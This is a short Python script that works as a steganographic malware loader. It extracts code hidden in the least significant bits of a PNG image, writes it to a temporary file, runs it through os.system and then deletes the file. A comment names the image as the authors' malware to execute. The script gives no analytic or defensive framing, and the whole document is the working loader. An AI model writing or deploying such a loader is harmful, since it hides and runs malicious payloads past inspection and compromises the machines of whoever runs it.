from stegano import lsb
import os

def extract_and_execute_code(image_path):
    # Extract the code from the image
    secret = lsb.reveal(image_path)

    # Save the code to a temporary file
    temp_code_file = 'temp_confidential_code.py'
    with open(temp_code_file, 'w') as file:
        file.write(secret)

    # Execute the code
    os.system('python {}'.format(temp_code_file))

    # Clean up temporary file
    os.remove(temp_code_file)

#Our Malware image that we gonna execute
image_path = 'image_with_malw.png'
extract_and_execute_code(image_path)
